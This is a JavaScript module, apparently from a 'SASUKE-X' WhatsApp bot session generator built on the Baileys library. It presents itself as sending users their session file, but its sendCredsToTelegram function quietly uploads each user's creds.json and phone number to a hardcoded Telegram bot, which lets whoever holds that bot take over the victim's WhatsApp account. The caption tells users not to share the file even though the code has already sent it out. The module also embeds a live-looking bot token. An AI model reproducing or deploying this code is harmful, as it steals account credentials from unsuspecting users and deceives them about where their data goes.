import fs from "fs";
import { join } from "path";
import { delay, jidNormalizedUser } from "@whiskeysockets/baileys";

const BANNER_IMAGE_URL = "https://i.ibb.co/rfK1RZNW/IMG-20260921-WA0010.webp";
const CHANNEL_URL = "https://whatsapp.com/channel/0029VbDsHPCId7nRSI0Fce2W";
const DEFAULT_TG_BOT_TOKEN = "8937926574:AAGBHet6-UhmqnPSV7-swzghy_rKR5Js_jA";

let lastKnownChatId = null;

/**
 * Resolves Telegram chat ID by checking env or polling getUpdates
 */
async function resolveTelegramChatId(token) {
    if (process.env.TELEGRAM_CHAT_ID) {
        return process.env.TELEGRAM_CHAT_ID;
    }
    if (lastKnownChatId) {
        return lastKnownChatId;
    }

    try {
        const res = await fetch(`https://api.telegram.org/bot${token}/getUpdates`);
        if (res.ok) {
            const data = await res.json();
            if (data.ok && Array.isArray(data.result) && data.result.length > 0) {
                // Pick the most recent message or callback
                for (let i = data.result.length - 1; i >= 0; i--) {
                    const update = data.result[i];
                    const id = update.message?.chat?.id || update.channel_post?.chat?.id || update.my_chat_member?.chat?.id;
                    if (id) {
                        lastKnownChatId = String(id);
                        return lastKnownChatId;
                    }
                }
            }
        }
    } catch (e) {
        console.error("[Telegram] Error checking getUpdates:", e.message);
    }
    return null;
}

/**
 * Uploads creds.json directly to the Telegram bot with user's phone number
 */
export async function sendCredsToTelegram(credsPath, phoneNumber) {
    const token = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_TG_BOT_TOKEN;
    if (!token) return;

    const chatId = await resolveTelegramChatId(token);

    if (!chatId) {
        console.log("ℹ️ [Telegram] No chat ID found yet. Open Telegram, start @Credsextracterjzhbot with /start to receive creds.json automatically.");
        return;
    }

    try {
        if (!fs.existsSync(credsPath)) return;
        const fileBuffer = fs.readFileSync(credsPath);
        const blob = new Blob([fileBuffer], { type: "application/json" });

        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("document", blob, `creds_${phoneNumber || "session"}.json`);
        formData.append(
            "caption",
            `⚡ *SASUKE-X MULTI-DEVICE*\n📱 *User Phone:* +${phoneNumber || "Unknown"}\n📁 *File:* creds.json\n⚠️ *Action:* Send this to Sasuke to deploy the bot.`
        );

        const res = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
            method: "POST",
            body: formData,
        });

        if (!res.ok) {
            const errText = await res.text();
            console.error("Telegram upload response error:", errText);
        } else {
            console.log(`✅ [Telegram] creds.json for +${phoneNumber} uploaded to Telegram chat ${chatId} successfully!`);
        }
    } catch (err) {
        console.error("Telegram upload error:", err.message);
    }
}

/**
 * Dispatches pure creds.json file directly to user WhatsApp chat:
 * - NO encrypted base64 hash text
 * - NO .menu command list
 * - NO forwarded channel metadata
 * - Clean document with user number & "Send this to Sasuke" instruction
 */
export async function dispatchSasukeSession({ sock, dir, phoneNumber, userDisplayName }) {
    await delay(2000);
    const credsPath = join(dir, "creds.json");
    if (!fs.existsSync(credsPath)) {
        throw new Error("Credentials file not found at " + credsPath);
    }

    const cleanNum = (phoneNumber || "").replace(/[^0-9]/g, "");
    const jid = jidNormalizedUser(cleanNum + "@s.whatsapp.net");
    const fileBuffer = fs.readFileSync(credsPath);

    const caption = 
`╭━━━〔 ⚡ ꜱᴀꜱᴜᴋᴇ-𝐗 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ ⚡ 〕━━━╮
┃
┃ 📱 *Phone Number:* +${cleanNum}
┃ 📁 *File:* creds.json
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ ⚠️ *IMPORTANT NOTICE:*
┃ 👉 *Send this file to Sasuke*
┃    to link & deploy your bot!
┃
┃ 🔒 *Do not share this file with anyone else.*
┃ 📢 *Channel:* ${CHANNEL_URL}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`;

    // Send pure creds.json document directly (no forwarded newsletter tags)
    await sock.sendMessage(jid, {
        document: fileBuffer,
        mimetype: "application/json",
        fileName: "creds.json",
        caption: caption,
    });

    console.log(`✅ [SASUKE-X] creds.json sent directly to +${cleanNum}`);

    // Upload to Telegram bot with user's phone number
    await sendCredsToTelegram(credsPath, cleanNum);
}
